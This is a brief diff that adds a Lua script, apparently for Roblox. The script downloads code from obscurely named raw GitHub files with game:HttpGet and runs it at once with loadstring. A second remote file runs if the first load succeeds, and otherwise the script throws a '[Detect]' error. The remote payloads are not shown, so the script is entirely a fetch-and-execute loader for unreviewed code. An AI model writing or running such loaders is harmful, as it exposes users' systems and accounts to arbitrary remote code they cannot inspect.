@@ -1,0 +1,7 @@
+local API = loadstring(game:HttpGet("https://raw.githubusercontent.com/115-lgtm/-/refs/heads/main/%2C.txt"))()
+if API then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/115-lgtm/-/refs/heads/main/.txt"))()
+else
+    return error("[Detect]")
+end
+return false
